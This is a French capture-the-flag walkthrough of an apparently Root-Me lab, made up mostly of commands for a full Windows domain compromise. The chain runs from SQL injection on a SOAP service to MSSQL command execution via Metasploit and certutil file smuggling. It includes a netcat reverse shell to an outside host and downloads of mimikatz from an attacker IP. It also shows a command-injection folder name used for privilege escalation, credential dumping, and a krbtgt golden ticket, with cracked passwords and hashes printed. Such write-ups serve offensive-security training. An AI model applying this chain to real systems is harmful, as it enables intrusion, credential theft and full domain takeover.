1] SQL injection sur le service web SOAP (SOAP UI) => on obtient les hashs des admins
    [
        pentestmonkey => SELECT master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
        john sur les hashs sélectionnés => sa : ChangeMe
    ]

2] Remote access sur la première machine
    [
        msfconsole => use auxiliary/admin/mssql/mssql_exec; set PASSWORD ChangeMe; set RHOST ctf0x.root-me.org; set CMD 'ipconfig /all'; exploit
    ]
    OU
    [
        client MS-SQL (dbeaver par exemple) => EXEC master..xp_cmdshell 'whoami'
    ]
    OU
    [
        msfconsole => use exploit/windows/mssql/mssql_payload; set PASSWORD ChangeMe; set RHOST ctf0x.root-me.org; exploit; background
    ]
    On est maintenant "nt service\mssql$mobileappdb" sur la première machine

3] Upload de ce qu'on veut sur le serveur
    [
        msfconsole => use auxiliary/admin/mssql/mssql_exec
                      set PASSWORD ChangeMe
                      set RHOST ctf08.root-me.org
                      set cmd 'del %TEMP%\\t && del %TEMP%\\u && echo -----BEGIN CERTIFICATE----->>%TEMP%\\t'
                      exploit
                      set cmd 'echo
                            [base64_encode(A)]
                          >>%TEMP%\\t'
                      exploit
                      set cmd 'echo -----END CERTIFICATE----->>%TEMP%\\t && type %TEMP%\\t &&
                          certutil -decode %TEMP%\\t %TEMP%\\u'
                      exploit
    ]
    %TEMP%\\u contient maintenant A

powershell -File %TEMP%\\script.ps1

4] Upload mimikatz + priv escalation + exécution
    [
        base64 sur l'executable => b64
        f = open('b64', 'r').read().split('\n')
        out = open('out', 'w+')
        for i in range(0,len(f),6):
            out.write('set cmd echo '+''.join(f[i:i+6])+'>>%TEMP%\\\\t\nexploit\n')
        commande 3 au dessus en 3 temps (en-tête, tous les exploits d'ajout (dans out), fin)
    ]
    Ou
    [
        script_metasploit_cmds reverse_shell.ps1 lol %TEMP%\\tmp %TEMP%\\rev.ps1 qui se connecte sur bonetti.io sur le port 4444
        nc -l -p 4444 -vvv sur bonetti.io => donne un shell powershell
        wget https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1
        python -m SimpleHTTPServer sur la machine remote

        puis sur la console powershell
        cd C:\Users\MSSQL$~1\AppData\Local\Temp

        $tmp = New-Object System.Net.WebClient
        $path = "C:\Users\MSSQL$~1\AppData\Local\Temp\nc.exe"
        $tmp.DownloadFile("http://178.62.222.31:8000/nc64.exe", $path)
        $tmp.DownloadFile("http://178.62.222.31:8000/Invoke-Mimikatz.ps1", "C:\Users\MSSQL$~1\AppData\Local\Temp\ici.ps1")

        Le serveur contient un fichier qui montre les credentials d'un utilisateur BS\klibby (mdp : Clem1997!) (dans D:\shares\DevOps\Apps\ContactsWebservice\)
        On peut se connecter en RDP avec ces identifiants et surtout créer un dossier dans D:\shares\DevOps pour déclencher le trick avec le script admin qui liste les contenus des dossiers.
        On créer ainsi un dossier "aaaa&start lol.bat" avec un fichier lol.bat dans ce dossier qui contient "Net localgroup administrators bs\klibby /add".
        On est maintenant admin sur la machine.

        $tmp.DownloadFile("http://178.62.222.31:8000/mimi/mimidrv.sys", "C:\Users\klibby\Desktop\mimidrv.sys")
        $tmp.DownloadFile("http://178.62.222.31:8000/mimi/mimikatz.exe", "C:\Users\klibby\Desktop\mimikatz.exe")
        $tmp.DownloadFile("http://178.62.222.31:8000/mimi/mimilib.dll", "C:\Users\klibby\Desktop\mimilib.dll")

        exécution de mimikatz en mode admin :
        privilege::debug
        sekurlsa::logonpasswords
        Résultat stocké dans le fichier passwords ici :
        -pcook: ImGodwithb!gp@ssword
   	    -klibby: Clem1997!
        -rsanchez: Colombi@1974
    ]

5] Connexion en RDP depuis la première machine vers dc01.bs.corp (pour avoir cet hostname, la commande nltest /dclist:BS peut être utilisée)
   Upload de mimikatz, fgdump et psGetSid sur la nouvelle machine
   Exécution de fgdump en mode admin pour récupérer le ntlm de krbtgt, et de psGetSid pour récupérer le SID.
   ntlm(krbgtg) : 7BEB07D5774A616E31333A3EF7E7946E
   SID : S-1-5-21-2465045178-3688936882-4255896025

   Puis dans kerberos :
   kerberos::golden /admin:egoldstein /domain:BS.CORP /sid:S-1-5-21-2465045178-3688936882-4255896025 /krbtgt:7BEB07D5774A616E31333A3EF7E7946E /ticket:gold.kiribi
   kerberos::ptt gold.kiribi
   kerberos::tgt

   Enfin lancement d'internet explorer sur srvstaff.bs.corp => LotsOfFunWithThisMicrosoftStuffs
